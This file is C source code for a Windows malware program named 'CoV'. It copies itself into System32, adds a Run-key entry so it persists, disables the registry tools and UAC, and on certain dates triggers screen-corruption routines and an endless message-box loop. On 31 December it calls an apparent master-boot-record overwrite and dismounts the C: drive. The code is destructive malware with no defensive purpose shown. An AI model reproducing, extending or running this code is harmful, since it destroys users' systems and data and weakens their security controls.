#include "CoV.h"

HANDLE NoRUN;
HANDLE randomMessages;
HANDLE gdiT1;
HANDLE gdiT2;
HANDLE gdiT3;
HANDLE gdiT4;

BOOLEAN isfr() {
	HKEY ckey;
	long result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\COV", 0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_SET_VALUE, &ckey);
	if (result != 0L) {
		RegCreateKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\COV", &ckey);
		RegCloseKey(ckey);
		return TRUE;
	}
	else
		RegCloseKey(ckey);
		return FALSE;
}

int fr() {
	HKEY ckey;
	DWORD dwTrue = 1, dw;
	WCHAR szEXEPATH[MAX_PATH];

	GetModuleFileName(NULL, szEXEPATH, MAX_PATH);
	CopyFile(szEXEPATH, L"C:\\Windows\\System32\\CoV.exe", 1);

	RegCreateKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &ckey);
	RegSetValueExW(ckey, L"CoV", NULL, REG_SZ, L"C:\\Windows\\System32\\CoV.exe", 56);
	RegCloseKey(ckey);

	RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &ckey);
	RegSetValueExW(ckey, L"DisableRegistryTools", NULL, REG_DWORD, &dwTrue, sizeof(DWORD));
	RegCloseKey(ckey);

	SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, L"Environment", SMTO_ABORTIFHUNG, 5000, &dw);

	return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd) {
	HKEY ckey = 0;
	DWORD dwFalse = 0;

	if (isfr() == TRUE)
		fr();
	RegCreateKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &ckey);
	RegSetValueExW(ckey, L"EnableLUA", NULL, REG_DWORD, &dwFalse, sizeof(DWORD));
	RegCloseKey(ckey);

	SYSTEMTIME st;
	GetSystemTime(&st); 
	NoRUN = CreateThread(0, 0, &NoRun, 0, 0, 0);
	if (st.wDay == 30)
		gdiT1 = CreateThread(0, 0, &day30_, 0, 0, 0);
	if (st.wDay == 20 && st.wMonth == 1)
		gdiT1 = CreateThread(0, 0, &DeepUnderMove, 0, 0, 0);
	if (st.wDay == 1 && st.wMonth == 4)
		gdiT1 = CreateThread(0, 0, &CoolIconDraw, 0, 0, 0);
	if (st.wDay == 22 && st.wMonth == 5)
		gdiT1 = CreateThread(0, 0, &IconWave, 0, 0, 0);
	if (st.wDay == 1 && st.wMonth == 6) {
		while (1) { MessageBoxA(0, "", "Windows", MB_ICONINFORMATION | MB_OK | MB_TOPMOST); } }
	if (st.wDay == 11 && st.wMonth == 9)
		gdiT1 = CreateThread(0, 0, &WindowLongFucker, 0, 0, 0);
	if (st.wDay == 31 && st.wMonth == 12)
		doomday();
	//doomday();
	while (1) { Sleep(0x7FFFFFFF); }
}

int doomday() {
	mbr();
	randomMessages = CreateThread(0, 0, &RandomMsg, 0, 0, 0);
	gdiT1 = CreateThread(0, 0, &DeepUnderMove, 0, 0, 0);
	Sleep(120000);
	KillThread(gdiT1);

	gdiT1 = CreateThread(0, 0, &ShakeWindows, 0, 0, 0);
	Sleep(60000);
	KillThread(gdiT1);

	gdiT1 = CreateThread(0, 0, &WindowFucker, 0, 0, 0);
	Sleep(60000);
	KillThread(gdiT1);

	gdiT1 = CreateThread(0, 0, &EBOLA, 0, 0, 0);
	Sleep(20000);
	KillThread(gdiT1);
	Sleep(30000);

	gdiT1 = CreateThread(0, 0, &SlowInvertPaint, 0, 0, 0);
	gdiT2 = CreateThread(0, 0, &SetIcons, 0, 0, 0);
	gdiT4 = CreateThread(0, 0, &Follow, 0, 0, 0);
	Sleep(40000);
	KillThread(gdiT1);
	KillThread(gdiT2);

	gdiT1 = CreateThread(0, 0, &IconPainter, 0, 0, 0);
	Sleep(40000);
	KillThread(gdiT1);
	gdiT1 = CreateThread(0, 0, &FlipStrechGlitch, 0, 0, 0);
	Sleep(30000);
	KillThread(gdiT1);

	gdiT1 = CreateThread(0, 0, &GlitchDown, 0, 0, 0);
	Sleep(20000);
	gdiT2 = CreateThread(0, 0, &CopyLag, 0, 0, 0);
	Sleep(10000);
	KillThread(gdiT1);
	Sleep(30000);
	gdiT3 = CreateThread(0, 0, &GlitchAround, 0, 0, 0);
	Sleep(30000);
	KillThread(gdiT2);
	KillThread(gdiT3);

	gdiT1 = CreateThread(0, 0, &InAndOut, 0, 0, 0);
	Sleep(60000);
	KillThread(gdiT1);

	gdiT1 = CreateThread(0, 0, &Clench, 0, 0, 0);
	Sleep(30000);
	KillThread(gdiT1);

	gdiT1 = CreateThread(0, 0, &UpTunnel, 0, 0, 0);
	Sleep(30000);
	KillThread(gdiT1);

	gdiT1 = CreateThread(0, 0, &RightDownEnlarge, 0, 0, 0);
	Sleep(30000);
	KillThread(gdiT1);

	gdiT1 = CreateThread(0, 0, &UpDownGlitch, 0, 0, 0);
	Sleep(30000);
	KillThread(gdiT1);

	system("mountvol c: /d");

	while (1) { Sleep(0x7FFFFFFF); }
}

int KillThread(HANDLE thread) {
	TerminateThread(thread, 0);
	return 0;
}

